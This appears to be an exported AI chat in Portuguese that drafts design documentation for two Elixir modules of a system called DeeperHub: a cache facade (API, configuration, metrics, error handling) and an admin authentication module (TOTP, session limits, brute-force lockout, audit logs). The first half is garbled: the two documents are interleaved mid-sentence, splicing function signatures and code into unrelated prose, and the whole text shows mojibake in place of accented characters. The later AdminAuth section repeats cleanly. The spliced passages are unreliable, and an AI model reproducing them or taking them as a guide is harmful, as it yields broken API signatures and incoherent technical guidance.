    *   `DeeperHub.Security.AdminAuth.Schema.AdminActionLog`: Para auditoria de a√ß√µes de admin.
    *   `DCache`):**
    *   Verifica se a `key` existe e n√£o est√° expirada.
    *   **Cache Hit:** Se sim, retorna `{:ok, cached_value}` para o `CacheAdapter`.
    *   **Cache Miss:** Se n√£o, retorna `{:error, :not_found}` para o `CacheAdapter`.
5.  **`Shared.Cache.CacheAdapter`:**
    *   **Se Cache Hit:** Retorna o `cached_value`eeperHub.Security.AdminAuth.Schema.AdminAction`, `AdminActionRisk`, `AdminActionVerification`: Para definir e controlar o risco de a√ß√µes administrativas.
8.  **Integra√ß√£o com `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`:**
    *   Para pol√≠ticas de senha de admin, dura√ß√£o de sess√£o de admin, pol√≠ticas para a fachada, que retorna para o chamador.
    *   **Se Cache Miss:**
        *   Executa a `generator_fun.()`.
        *   Se a fun√ß√£o retornar `{:ok, new_value}`:
            *   Chama `put(key, new_value, ttl, namespace)` na implementa√ß√£o de backend.
            *   Ret de MFA de admin.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/admin_auth/
‚îú‚îÄ‚îÄ admin_auth.ex                     # Fachada P√∫blica (AdminAuthAdapter da doc original)
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ admin_auth_service.ex         # Servi√ßoorna `new_value` para a fachada.
        *   Se a fun√ß√£o retornar `{:error, reason}`:
            *   Loga o erro.
            *   Retorna `{:error, reason}` para a fachada (e n√£o armazena no cache).
6.  **`Core.Cache` (Fachada):** Retorna o valor orquestrador
‚îÇ   ‚îú‚îÄ‚îÄ admin_totp_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_token_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action_auth_service.ex
‚îÇ   ‚îî‚îÄ‚îÄ permission_service.ex         # (Ou usa DeeperHub.RBAC diretamente)
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/ singular (do cache ou gerado) ou o erro para o chamador.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Core.Cache`)

*(Baseado na API do `DeeperHub.Shared)
‚îÇ   ‚îú‚îÄ‚îÄ admin_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_token.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_totp.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action_log.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action_risk.ex
‚îÇ   ‚îî‚îÄ‚îÄ admin_action_verification.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex                      # (Se necess√°rio, espec√≠fico para AdminAuth)
```

### 3.3. Decis√µes de Design.Cache.CacheService` e `CacheAdapter` da documenta√ß√£o original, consolidando e usando TTLs em segundos para consist√™ncia).*

### 6.1. `DeeperHub.Core.Cache.get(key :: String.t() | atom(), default_value :: term() | nil, opts :: keyword()) :: {:ok, term()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Recupera um valor do cache.
*   **`opts Importantes

*   **Isolamento (Parcial ou Total):** Decidir se a autentica√ß√£o de admin usa um fluxo completamente separado ou se √© uma varia√ß√£o do fluxo de usu√°rio normal com pol√≠ticas mais r√≠gidas. Um fluxo separado pode oferecer maior seguran√ßa, mas tamb√©m maior complexidade.
*   **MFA Mandat√≥rio:** Para a maioria das contas de admin, MFA`:**
    *   `:namespace` (atom | String.t): Namespace opcional para a chave.
*   **Retorno:** `{:ok, value}` se encontrado e n√£o expirado, `{:ok, default_value}` se n√£o encontrado e default fornecido, sen√£o `{:error, :not_found}`.

### 6.2. `DeeperHub.Core.Cache.put(key :: String.t() | atom(), value :: term(), opts :: keyword()) :: :ok | {:error, term() (especialmente TOTP ou Chaves de Seguran√ßa) deve ser mandat√≥rio ou altamente imposto.
*   **Princ√≠pio do Menor Privil√©gio:** Administradores devem ter apenas as permiss√µes estritamente necess√°rias para suas fun√ß√µes. Ev}`

*   **Descri√ß√£o:** Armazena um valor no cache.
*   **`opts`:**
    *   `:ttl_seconds` (integer | `:infinity`): Tempo de vida em segundos. (Padr√£o: config global `cache.default_ttl_seconds`)
    *   `:namespace` (atom | String.t): Namespaceitar contas \"super admin\" gen√©ricas, se poss√≠vel.
*   **Step-up Authentication:** Para a√ß√µes administrativas particularmente destrutivas ou sens√≠veis, exigir uma nova verifica√ß√£o MFA mesmo que o admin j√° esteja logado.

##  opcional.

### 6.3. `DeeperHub.Core.Cache.delete(key :: String.t() | atom(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Remove uma entrada do cache.
*   **`opts`:** `:namespace`.

### 6.4. `DeeperHub.Core.Cache.üõ†Ô∏è 4. Casos de Uso Principais

*   **Administrador Faz Login no Painel:**
    *   Admin fornece username/senha na p√°gina de login do painel.
    *   `AdminAuth.authenticate_admin/3get_or_store(key :: String.t() | atom(), generator_fun :: (() -> {:ok, term()} | {:error, term()}), opts :: keyword()) :: {:ok, term()} | {:error, term()}`

*   **` √© chamado.
    *   Credenciais s√£o validadas.
    *   Se MFA estiver configurado, o fluxo de verifica√ß√£o TOTP (ou outro m√©todo) √© iniciado.
    *   Se tudo ok, uma sess√£o deDescri√ß√£o:** Obt√©m do cache ou executa `generator_fun`, armazena e retorna o resultado.
*   **`opts`:** `:ttl_seconds`, `:namespace`.
*   **Retorno:** `{:ok, value admin √© criada e um token √© emitido.
*   **Administrador Tenta Excluir um Usu√°rio:**
    *   Admin clica em \"Excluir Usu√°rio\" na interface.
    *   A interface chama um endpoint protegido.
    *   O}` ou `{:error, reason_from_generator_or_cache_error}`.

### 6.5. `DeeperHub.Core.Cache.increment(key :: String.t() | atom(), amount :: integer() | nil, opts :: backend verifica a sess√£o do admin.
    *   Chama `AdminAuth.authorize_action(admin_id, : keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descri√ß√£o:** Incrementdelete_user, %{target_user_id: \"xyz\"}, mfa_code_if_required)`.
    a atomicamente um valor num√©rico no cache. Se a chave n√£o existir, geralmente √© inicializada com `amount`.
*   **`amount`:** (Padr√£o: `1`)
*   **`opts`:** `:ttl_seconds`, `:namespace`.

*   `AdminActionAuthService` verifica se a a√ß√£o `:delete_user` requer MFA \"step-up\". Se sim### 6.6. `DeeperHub.Core.Cache.decrement(key :: String.t() | atom(), amount :: integer() | nil, opts :: keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descri√ß√£o:** Decrementa atomicamente um valor num√©rico.
*   *(Par√¢metros e, valida `mfa_code`.
    *   Verifica se o admin tem a permiss√£o \"pode_excluir_usuarios\" (via `PermissionService` / RBAC).
    *   Se autorizado, a a√ß√£o √© permitida.
    *   `AdminActionLog` registra a a√ß√£o.
*   **Administrador Altera uma Configura√ß√£o de Seguran√ßa Cr retorno similares a `increment/4`)*

### 6.7. `DeeperHub.Core.Cache.clear(√≠tica:**
    *   Similar ao caso acima, mas a a√ß√£o pode ser, por exemplo, `:update_securityopts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Limpa o cache.
*   **`opts`:** `:namespace` (para limpar apenas um namespace).

### 6.8. `DeeperHub.Core.Cache.delete_pattern(key_pattern :: String.t(), opts :: keyword()) :: {:ok, count_policy_mfa`.
    *   A autoriza√ß√£o e a poss√≠vel exig√™ncia de MFA step-up s√£o verificadas.

## üåä 5. Fluxos Importantes

### Fluxo de Autentica√ß√£o de Administrador com TOTP

1.  **Interface de Login Admin:** Admin submete username e password.
2.  **Backend_deleted :: integer()} | {:error, term()}`

*   **Descri√ß√£o:** Remove entradas do cache que correspondem a um padr√£o de chave (ex: `\"user_profiles:*\"`, a sintaxe do padr√£o depende do backend).
*   **`opts`:** `:namespace`.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :cache, :enabled]`** (Boolean): Habilita/desabilita o sistema de cache globalmente. (Padr√£o: `true`)
*   **`[:core, :cache, :default Controller:** Chama `DeeperHub.Security.AdminAuth.authenticate_admin(username, password, context)`.
3.  **`AdminAuthService`:**
    *   Valida credenciais prim√°rias (username/password).
    *   Se falhar, retorna erro e registra tentativa falha (considerando `BruteForceProtection` para admin).
    *   Se_adapter]`** (Module): M√≥dulo adaptador de cache padr√£o a ser usado (ex: `DeeperHub.Shared.Cache.Implementations.EtsCache`, `DeeperHub.Shared.Cache.Implementations.RedisAdapter`).
*   **`[:core, :cache, :default_ttl_seconds]`** (Integer): TTL padr√£o em segundos para novas entradas de cache se n√£o especificado. (Padr√£o: `3600` - 1 hora)
*   **`[:core, :cache, :ets_cache, :cleanup_interval_ms]`** (Integer sucesso, verifica se o admin tem TOTP configurado e ativo (via `AdminTOTPService.is_enabled?(admin_id)`).
    *   **Se TOTP Ativo:** Retorna `{:error, :mfa_totp_required, %{admin_id: admin.id}}` para o controller.
    *   **Se TOTP N√£o Ativo (e n√£o mandat√≥rio):** Procede para criar sess√£o e token (via `AdminTokenService`).
4.  **): Intervalo para limpeza de entradas expiradas no `EtsCache`. (Padr√£o: `60000`)
*   **`[:core, :cache, :redis_adapter, :url]`** (String): URL de conex√£o para o Redis, se usado.
*   **`[:core, :cache, :redis_adapter, :pool_size]`** (Integer): Tamanho do pool de conex√µes Redis.
*   **`[:core, :cache, :metrics_reporter, :report_interval_ms]`** (Integer): Intervalo para o `MetricsReporter` coletar/logar estatInterface de Login Admin:** Se `:mfa_totp_required`, exibe campo para c√≥digo TOTP. Admin submete o c√≥digo.
5.  **Backend Controller:** Chama `DeeperHub.Security.AdminAuth.Services.AdminTOTPService.verify(admin_id, totp_code)`.
6.  **`AdminTOTPService`:**
    *   Verifica o c√≥digo TOTP.
    *   Se v√°lido, retorna `{:ok, :√≠sticas do cache.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configura√ß√µes do cache.
*   `DeeperHub.Core.Logger`: Para logging de opera√ß√µes e erros do cache.
*   `DeeperHub.Core.Metrics`: Para registrar m√©tricas de desempenho do cache.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar os processos do `Shared.Cache`.

### 8.2. Bibliotecas Externas

*   Depende da implementa√ß√£o do backend:
    *   Nenhuma para ETS (nativo).
    *   `Redix` (ou similar) se `valid}`.
    *   Se inv√°lido, retorna erro e registra tentativa falha de MFA.
7.  **Backend Controller (ap√≥s TOTP v√°lido):**
    *   Chama `AdminAuthService` (ou diretamente `AdminTokenService` e `SessionManager`) para criar a sess√£o de admin e emitir tokens.
    *   Registra login bem-sucedido no `AdminActionLog`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Security.AdminAuth`)

### 6.1. `DeeperHub.Security.AdminAuth.authenticate_admin(username :: String.t(), password :: String.t(), opts :: keyword()) :: {:ok, %RedisAdapter` for usado.
    *   Outras bibliotecas cliente para outros backends (Memcached, etc.).

## ü§ù 9. Como Usar / Integra√ß√£o

Qualquer m√≥dulo que precise de caching pode usar a fachada `DeeperHub.Core.Cache`.

```elixir
defmodule MyApp.UserProfileService do
  alias DeeperHub.Core.Cache
  alias DeeperHub.Core.Repo
  alias MyApp.User

  def get_user_profile(user_id) do
    cache{admin: AdminSchema.t(), token: String.t()}} | {:error, :invalid_credentials | :account_locked | :mfa_required | :mfa_invalid}`

*   **Descri√ß√£o:** Autentica um administrador.
*   **`opts`:** `:ip_address`, `:device_info`, `:mfa_code` (se o fluxo de MFA for em uma √∫nica etapa).

### 6.2. `DeeperHub.Security.AdminAuth.verify_admin_mfa(admin_id :: String.t(), mfa_method :: atom(), code :: String.t(), opts :: keyword()) :: {:ok, %{admin: AdminSchema.t(), token: String.t()}} | {:error, :_key = \"user_profile:#{user_id}\"
    
    Cache.get_or_store(cache_key, fn ->
      case Repo.get(User, user_id) do
        nil -> {:error, :not_found} # N√£o armazena :not_found no cache por padr√£o
        user -> {:ok, Map.from_struct(user)} # Armazena o mapa
      end
    end, ttl_seconds: 1800) # Cache por 30 minutos
  end

  def update_user_profile(user, attrs) do
    # ... l√≥gica de atualiza√ß√£o ...
    case Repo.update(changeset) do
      {:ok, updated_user} ->
        Cache.delete(\"user_profile:#{updated_user.id}\") # Inmfa_invalid | :max_attempts_reached}` (Nova Sugest√£o)

*   **Descri√ß√£o:** Verifica um c√≥digo MFA para um admin que j√° passou pela autentica√ß√£o prim√°ria. Se sucesso, finaliza o login e retorna tokens.
*   **`mfa_method`:** Ex: `:totp`.

### 6.3. `DeeperHub.Security.AdminAuth.has_admin_permission?(admin_id :: String.t(), permission :: String.t() | atom(), resource_details :: map() | nil) :: boolean()`

*   **Descri√ß√£o:** Verifica se um administrador possui uma permiss√£o espec√≠fica.
*   **`permission`:** Ex: `\"users:delete\"`, `:view_audit_logs`.

### 6.4. `DeeperHub.Security.AdminAuth.authorize_action(admin_id :: String.t(), action_atom :: atom(), action_params :: map() | nil, verification_data :: map() | nil) :: :ok | {:error, :unauthorized | :mfa_required_for_action | :mfa_invalid}` (valida o cache
        {:ok, updated_user}
      {:error, changeset} ->
        {:error, changeset}
    end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada fun√ß√£o da API do cache (`get`, `put`, `delete`, `get_or_store`, `increment`).
*   Testar a l√≥gica de TTL e expira√ß√£o.
*   Testar a invalida√ß√£o por chave e por padr√£o.
*   Testar o comportamento com diferentes adaptadores de backend (mockeados ou reais em ambiente de teste).
*   Testar o tratamento de falhas do backend de cache (o cache n√£o deve quebrar a aplica√ß√£o).
*   Localiza√ß√£o: `test/deeper_hub/core/cache/` e `test/deeper_hub/shared/cache/`.

### 10.2. M√©tricas (via `Shared.Cache.MetricsReporter` ou `Core.Metrics`)

*   `deeper_hub.core.cache.operations.count` (tags: `operation` (`get`, `put`, `delete`), `namespace`, `status` (`hit`, `miss`, `success`, `error`))
*   `deeper_hub.core.cache.operation.duration_ms` (Histograma, tags: `operation`, `namespace`)
*   `deeper_hub.core.cacheNova Sugest√£o)

*   **Descri√ß√£o:** Autoriza uma a√ß√£o administrativa, possivelmente exigindo \"step-up authentication\" (MFA).
*   **`action_atom`:** Identificador √∫nico da a√ß√£o administrativa (ex: `:admin_update_user_role`).
*   **`verification_data`:** `%{mfa_code: \"123456\"}` se MFA for exigido pela pol√≠tica da a√ß√£o.

### 6.5. Fun√ß√µes CRUD para Admins (ex: `create_admin/1`, `get_admin/1`, `list_admins/1`, `update_admin/2`, `deactivate_admin/2`)

*   Estas fun√ß√µes gerenciariam as contas dos administradores.

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :admin_auth, :password_policy, :min_length]`** (Integer): Comprimento m√≠nimo da senha de admin. (Padr√£o: `12`)
*   **`[:security, :admin_auth, :password_policy, :expiry_days]`** (Integer): Dias para expira√ß√£o da senha de admin. (Padr√£o: `90`)
*   **`[:security, :admin_auth, :mfa, :is_mandatory]`** (Boolean): Se MFA √© obrigat√≥rio para todos os admins. (Padr√£o: `true`)
*   **`[:security, :admin_auth, :mfa, :allowed_methods]`** (List de Atoms): M√©todos MFA permitidos para admins (ex: `[:totp, :security_key]`).
*   **`[:security, :admin_auth, :session, :max_duration_seconds]`** (Integer): Dura√ß√£o m√°xima da sess√£o de admin. (Padr√£o: `28800` - 8 horas)
*   **`[:.size.items.gauge` (Gauge, tags: `namespace`): N√∫mero de itens no cache.
*   `deeper_hub.core.cache.size.bytes.gauge` (Gauge, tags: `namespace`, opcional): Tamanho estimado em bytes.
*   `deeper_hub.core.cache.hit_ratio.gauge` (Gauge, tags: `namespace`): Taxa de acerto (hits / (hits + misses)).
*   `deeper_hub.core.cache.evictions.count` (Contador, tags: `namespace`, `reason` (`ttl`, `manual`, `lru`)): N√∫mero de itens removidos.

### 10.3. Logs

*   **N√≠vel DEBUG:** Detalhes de opera√ß√µes de cache (get, put, delete) com chaves e namespaces.
*   **N√≠vel INFO:** Limpeza de cache iniciada/conclu√≠da. Inicializa√ß√£o do adaptador de cache.
*   **N√≠vel WARNING:** Alta taxa de \"cache miss\". Cache se aproximando da capacidade m√°xima (se aplic√°vel).
*   **N√≠vel ERROR:** Falha ao conectar ao backend de cache (ex: Redis). Erros persistentes em opera√ß√µes de cache.

### 10.4. Telemetria (via `Shared.Cache.Telemetry`)

*   `[:deeper_hub, :core, :cache, :operation, :start | :stop | :exception]`
    *   Metadados: `%{operation: :get | :put | :delete, key: key, namespace: ns, backend_adapter: adapter}`
    *   No `:stop`: `%{result: :hit | :miss | :success, value_size: bytes_if_applicable}`
*   `[:deeper_hub, :core, :cache, :cleanup, :start | :stop]`
    *   Medi√ß√µes: `%{items_removed: count}`

## ‚ùå 11. Tratamento de Erros

*   **Cache Indispon√≠vel:** Se o backend de cache (ex: Redis) estiver offline, as opera√ß√µes de cache devem falhar graciosamente. `getsecurity, :admin_auth, :session, :idle_timeout_seconds]`** (Integer): Timeout de inatividade para sess√£o de admin. (Padr√£o: `900` - 15 minutos)
*   **`[:security, :admin_auth, :brute_force, :max_login_attempts]`** (Integer): M√°ximo de tentativas de login admin antes do bloqueio. (Padr√£o: `3`)
*   **`[:security, :admin_auth, :brute_force, :lockout_duration_minutes]`** (Integer): Dura√ß√£o do bloqueio de conta admin. (Padr√£o: `60`)
*   **`[:security, :admin_auth, :actions, <action_name>, :requires_mfa_step_up]`** (Boolean): Define se uma a√ß√£o admin espec√≠fica requer re-autentica√ß√£o MFA.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Auth` (potencialmente para a base de hashing de senha, gerenciamento de sess√£o, se n√£o for totalmente separado).
*   `DeeperHub.MFA`: Para a l√≥gica de TOTP e outros m√©todos MFA.
*   `DeeperHub.RBAC`: Para gerenciamento de pap√©is e permiss√µes administrativas.
*   `DeeperHub.Audit`: Essencial para registrar todas as a√ß√µes administrativas.
*   `DeeperHub.Security.BruteForceProtection`: Para proteger o login de admin.
*   `DeeperHub.Tokens`: Para gerenciamento de tokens de sess√£o de admin.

### 8.2. Bibliotecas Externas

*   As mesmas de `DeeperHub.Auth` (Joken, Argon2, etc.) se compartilhar a base.
*   Bibliotecas TOTP (ex: `ex_totp`).

## ü§ù 9. Como Usar / Integra√ß√£o

*   **Interface de Administra√ß√£o (Web ou Console):**
    *   Usar `AdminAuth.authenticate_admin/3` para o fluxo de login.
    *   Antes de executar qualquer a√ß√£o administrativa, chamar `AdminAuth.has_admin_permission?/3` ou `AdminAuth.authorize_action/4`.
*   **Prote√ß√£o de Rotas (Phoenix):**
    ```elixir
    # Em lib/deeper_hub_web/router.ex
    pipeline :admin_auth do
      plug MyAppWeb.Plugs.VerifyAdminSessionPlug # Verifica token de sess√£o de admin
      plug MyAppWeb.Plugs.VerifyAdminPermissionPlug, permission: :access_admin_panel_or_store` deve executar a fun√ß√£o geradora e retornar seu resultado diretamente, sem tentar armazenar. `put` e `delete` podem simplesmente logar o erro e retornar `:ok` (ou um erro n√£o bloqueante) para n√£o quebrar o fluxo da aplica√ß√£o.
*   **Erro de Serializa√ß√£o:** Se os dados n√£o puderem ser serializados para o cache, um erro deve ser logado e a opera√ß√£o de cache deve falhar.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **N√£o Armazenar Dados Extremamente Sens√≠veis em Cache (a menos que o cache seja seguro):** Se o backend de cache n√£o for t√£o seguro quanto o banco de dados prim√°rio (ex: Redis sem criptografia em tr√¢nsito/repouso vs. DB com TDE), evite cachear dados altamente sens√≠veis.
*   **Cache Poisoning:** Embora menos comum para caches de servidor, esteja ciente da possibilidade se as chaves de cache puderem ser influenciadas diretamente por entradas de usu√°rio n√£o sanitizadas. Use chaves bem definidas e prefixadas.
*   **Seguran√ßa do Backend de Cache:** Se usar Redis/Memcached, proteja o acesso a esses servidores (firewall, autentica√ß√£o).

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Use chaves de cache consistentes e com namespaces para evitar colis√µes.
*   Defina TTLs apropriados para os dados cacheados. Dados que mudam raramente podem ter TTLs longos; dados vol√°teis, TTLs curtos ou invalida√ß√£o baseada em eventos.
*   Considere o tamanho dos dados armazenados em cache para n√£o esgotar a mem√≥ria (especialmente com ETS).

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar \"cache stampede protection\" (ou \"dog-piling effect\" prevention) para `get_or_store`, onde apenas um processo regenera um item de cache expirado enquanto outros esperam ou recebem o valor antigo por um curto per√≠odo.
*   [ ] Adicionar suporte para diferentes estrat√©gias de remo√ß√£o (eviction policies) no `EtsCache` (ex: LRU, LFU) se ele se tornar muito grande.
*   [ ] Desenvolver um `CacheWarmer` que possa pr√©-carregar dados importantes no cache durante a inicializa√ß√£o da aplica√ß√£o.
*   [ ] Suporte para cache em camadas (ex: ETS local como L1, Redis como L2).
*   [ ] Interface administrativa para visualizar o conte√∫do do cache, estat√≠sticas e invalidar entradas manualmente.

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Caching √© um t√≥pico vasto, mas essencial para performance!

O que gostaria de ver a seguir? Podemos ir para `DeeperHub.Core.Repo` para falar sobre persist√™ncia, ou talvez `DeeperHub.Security.DdosProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° que mencionamos o `DeeperHub.Security.AdminAuth` como uma poss√≠vel especializa√ß√£o ou um m√≥dulo separado, vamos detalh√°-lo. A seguran√ßa da interface administrativa √© de suma import√¢ncia.

---

# M√≥dulo: `DeeperHub.Security.AdminAuth` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.AdminAuth`

O m√≥dulo `DeeperHub.Security.AdminAuth` √© dedicado especificamente √† **autentica√ß√£o e autoriza√ß√£o de usu√°rios administradores** que acessam as interfaces de gerenciamento e administra√ß√£o do sistema DeeperHub. Ele fornece um conjunto de funcionalidades de seguran√ßa mais rigorosas e adaptadas √†s necessidades de contas com privil√©gios elevados.

Isso pode incluir:
*   Autentica√ß√£o de dois fatores (MFA/TOTP) obrigat√≥ria ou fortemente recomendada.
*   Pol√≠ticas de senha mais estritas.
*   Monitoramento e auditoria detalhada de todas as a√ß√µes administrativas.
*   Gerenciamento de sess√µes de administrador com timeouts mais curtos.
*   Controle de acesso granular √†s diferentes funcionalidades administrativas baseado em pap√©is e permiss√µes espec√≠ficas de administra√ß√£o.

O objetivo √© proteger as √°reas mais sens√≠veis do sistema DeeperHub contra acesso n√£o autorizado e abuso de privil√©gios. üòä

*(Nota: Se a autentica√ß√£o de administradores for gerenciada pelo mesmo sistema que usu√°rios regulares (`DeeperHub.Auth`) mas com pol√≠ticas diferentes, este m√≥dulo pode atuar como uma camada de especializa√ß√£o ou configura√ß√£o sobre `DeeperHub.Auth`. Se for um sistema completamente separado, ele ter√° seus pr√≥prios componentes de login, sess√£o, etc.)*

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Autentica√ß√£o de Administradores (`authenticate_admin/3`):**
    *   Verificar credenciais (username/password) espec√≠ficas para contas de administrador.
    *   For√ßar ou gerenciar a verifica√ß√£o de Autentica√ß√£o Multifator (MFA), especialmente TOTP (via `AdminTOTPService`).
*   **Gerenciamento de Contas de Administrador (`create_admin/1`, `update_admin/2`, etc.):**
    *   Cria√ß√£o, atualiza√ß√£o, ativa√ß√£o/desativa√ß√£o de contas de administrador.
    *   Atribui√ß√£o de pap√©is e permiss√µes administrativas espec√≠ficas (integrando com `DeeperHub.RBAC`).
*   **Pol√≠ticas de Senha de Administrador:**
    *   Aplicar pol√≠ticas de complexidade e expira√ß√£o de senha mais rigorosas para administradores.
*   **Gerenciamento de Sess√µes de Administrador:**
    *   Criar sess√µes com dura√ß√µes e timeouts de inatividade potencialmente mais curtos.
    *   Invalidar sess√µes de administrador (ex: ap√≥s mudan√ßa de senha, detec√ß√£o de risco).
    *   Gerenciar tokens de sess√£o espec√≠ficos para administradores (via `AdminTokenService`).
*   **Autoriza√ß√£o de A√ß√µes Administrativas (`authorize_action/4`, `has_admin_permission?/2`):**
    *   Verificar se um administrador autenticado tem permiss√£o para executar uma a√ß√£o administrativa espec√≠fica ou acessar uma funcionalidade do painel de controle.
    *   Potencialmente exigir verifica√ß√£o MFA adicional para a√ß√µes administrativas de alto risco, mesmo se j√° logado (step-up authentication).
*   **Auditoria Detalhada (`AdminActionLog`):**
    *   Registrar todas as tentativas de login de administrador (sucesso e falha).
    *   Registrar todas as a√ß√µes significativas realizadas por administradores autenticados.
*   **Gerenciamento de Tokens de Administrador (`AdminTokenService`):**
    *   Gera√ß√£o, valida√ß√£o e revoga√ß√£o de tokens de sess√£o para administradores.
*   **Prote√ß√£o contra For√ßa Bruta para Login de Admin:**
    *   Aplicar pol√≠ticas de bloqueio mais estritas para tentativas falhas de login de administrador.

## üèóÔ∏è 3. Arquitetura e Design

A arquitetura pode variar dependendo se √© uma extens√£o do `DeeperHub.Auth` ou um subsistema mais independente. Assumindo uma especializa√ß√£o:

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.AdminAuth` (Fachada P√∫blica):**
    *   Ponto de entrada para funcionalidades de autentica√ß√£o e autoriza√ß√£o de administradores.
    *   Delega para `AdminAuthService`.
2.  **`DeeperHub.Security.AdminAuth.Services.AdminAuthService`:**
    *   Servi√ßo central que orquestra a autentica√ß√£o, gerenciamento de contas e verifica√ß√£o de permiss√µes de admin.
    *   Utiliza `AdminTOTPService`, `AdminTokenService`, `PermissionService` (espec√≠fico para admin ou o RBAC geral), e `AdminActionAuthService`.
3.  **`DeeperHub.Security.AdminAuth.Services.AdminTOTPService`:**
    *   Gerencia a configura√ß√£o e verifica√ß√£o de TOTP para administradores.
4.  **`DeeperHub.Security.AdminAuth.Services.AdminTokenService`:**
    *   Gerencia o ciclo de vida de tokens de sess√£o para administradores.
5.  **`DeeperHub.Security.AdminAuth.Services.AdminActionAuthService`:**
    *   Verifica se um admin est√° autorizado a realizar uma a√ß√£o espec√≠fica, possivelmente exigindo \"step-up authentication\" com MFA.
6.  **`DeeperHub.Security.AdminAuth.Services.PermissionService` (ou integra√ß√£o com `DeeperHub.RBAC`):**
    *   Define e verifica permiss√µes granulares para o painel de administra√ß√£o (ex: \"gerenciar_usuarios\", \"ver_logs_auditoria\", \"configurar_sistema\").
7.  **Schemas Ecto:**
    *   `DeeperHub.Security.AdminAuth.Schema.AdminSchema`: Para dados da conta de administrador.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminToken`: Para tokens de sess√£o de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminTOTP`: Para configura√ß√µes TOTP de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminActionLog`: Para auditoria de a√ß√µes de admin.
    *   `DeeperHub.Security.AdminAuth.Schema.AdminAction`, `AdminActionRisk`, `AdminActionVerification`: Para definir e controlar o risco de a√ß√µes administrativas.
8.  **Integra√ß√£o com `DeeperHub.Core.ConfigManager` / `SecurityPolicyManager`:**
    *   Para pol√≠ticas de senha de admin, dura√ß√£o de sess√£o de admin, pol√≠ticas de MFA de admin.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/admin_auth/
‚îú‚îÄ‚îÄ admin_auth.ex                     # Fachada P√∫blica (AdminAuthAdapter da doc original)
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ admin_auth_service.ex         # Servi√ßo orquestrador
‚îÇ   ‚îú‚îÄ‚îÄ admin_totp_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_token_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action_auth_service.ex
‚îÇ   ‚îî‚îÄ‚îÄ permission_service.ex         # (Ou usa DeeperHub.RBAC diretamente)
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/ singular)
‚îÇ   ‚îú‚îÄ‚îÄ admin_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_token.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_totp.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action_log.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action.ex
‚îÇ   ‚îú‚îÄ‚îÄ admin_action_risk.ex
‚îÇ   ‚îî‚îÄ‚îÄ admin_action_verification.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex                      # (Se necess√°rio, espec√≠fico para AdminAuth)
```

### 3.3. Decis√µes de Design Importantes

*   **Isolamento (Parcial ou Total):** Decidir se a autentica√ß√£o de admin usa um fluxo completamente separado ou se √© uma varia√ß√£o do fluxo de usu√°rio normal com pol√≠ticas mais r√≠gidas. Um fluxo separado pode oferecer maior seguran√ßa, mas tamb√©m maior complexidade.
*   **MFA Mandat√≥rio:** Para a maioria das contas de admin, MFA (especialmente TOTP ou Chaves de Seguran√ßa) deve ser mandat√≥rio ou altamente imposto.
*   **Princ√≠pio do Menor Privil√©gio:** Administradores devem ter apenas as permiss√µes estritamente necess√°rias para suas fun√ß√µes. Evitar contas \"super admin\" gen√©ricas, se poss√≠vel.
*   **Step-up Authentication:** Para a√ß√µes administrativas particularmente destrutivas ou sens√≠veis, exigir uma nova verifica√ß√£o MFA mesmo que o admin j√° esteja logado.

## üõ†Ô∏è 4. Casos de Uso Principais

